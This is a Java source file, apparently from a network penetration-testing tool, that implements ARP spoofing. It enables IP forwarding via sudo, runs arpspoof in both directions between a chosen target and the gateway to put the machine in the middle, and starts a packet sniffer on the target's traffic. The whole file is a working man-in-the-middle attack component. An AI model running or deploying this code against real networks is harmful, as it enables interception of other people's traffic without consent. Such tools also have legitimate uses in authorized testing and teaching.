package org.npt.networkservices.defaults;

import lombok.extern.slf4j.Slf4j;
import org.npt.models.Task;
import org.npt.networkservices.ArpSpoofStarter;
import org.npt.services.impl.ProcessService;

@Slf4j
public class ArpSpoofStarterImpl implements ArpSpoofStarter {

    private static final String COMMAND = "sudo arpspoof -i %s -t %s %s";
    private static final String PROCESS_NAME = "Spoofing the following Target : %s , Gateway : %s";
    private static ArpSpoofStarterImpl instance = null;

    private ArpSpoofStarterImpl() {
        ProcessService.execute("Enable IP Forwarding", new String[]{"sudo sysctl -w net.ipv4.ip_forward=1"});
    }

    public void stopSpoofing(String targetIp, String gatewayIp) {
        final String processName = ProcessService.ProcessUtils.generateProcessNameFrom(String.format(PROCESS_NAME, targetIp, gatewayIp));
        ProcessService.getTasks().stream()
                .filter(task -> task.getProcessName().equals(processName))
                .forEach(Task::destroy);
    }

    public void startSpoofing(String scanInterface, String targetIp, String gatewayIp) {
        final String commandFirst = String.format(COMMAND, scanInterface, targetIp, gatewayIp);
        final String commandSecond = String.format(COMMAND, scanInterface, gatewayIp, targetIp);
        String processName = String.format(PROCESS_NAME, targetIp, gatewayIp);
        processName = ProcessService.ProcessUtils.generateProcessNameFrom(processName);
        ProcessService.execute(processName, new String[]{commandFirst});
        ProcessService.execute(processName, new String[]{commandSecond});
        DefaultPacketSniffer defaultPacketSniffer = new DefaultPacketSniffer(targetIp, scanInterface);
        new Thread(defaultPacketSniffer).start();
    }

    public static ArpSpoofStarterImpl getInstance() {
        if (instance == null)
            instance = new ArpSpoofStarterImpl();
        return instance;
    }

}
